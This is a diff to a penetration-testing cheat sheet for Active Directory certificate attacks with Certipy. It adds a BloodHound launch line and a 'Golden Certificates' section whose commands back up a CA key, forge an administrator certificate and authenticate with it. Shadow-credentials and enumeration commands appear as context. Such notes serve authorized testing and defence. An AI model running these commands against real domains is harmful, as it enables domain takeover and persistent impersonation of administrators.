@@ -14,6 +14,7 @@ WORKDIR /tmp
 
 ```bash
 sudo docker run -it -v $(pwd):/tmp --rm certipy:latest certipy find -u user@domain.local -p 'newP@ssword2022' -vulnerable -ns 192.168.210.10 -bloodhound
+./BloodHound  --no-sandbox --disable-dev-shm-usage
 ```
 
 ## Check vulnerabilities
@@ -222,6 +223,14 @@ Shadow credentials attack consist of using the GenericAll or GenericWrite privil
 
 ```bash
 certipy shadow auto -u username@domain.com -p 'password' -account 'targetUsername'
+```
+
+### Backup - Golden Certficates
+
+```bash
+certipy ca -backup -ca 'corp-DC-CA' -u user@domain.com -p 'password'
+certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'
+certipy auth -pfx administrator_forged.pfx -dc-ip dcIP
 ```
 
 ## CVEs
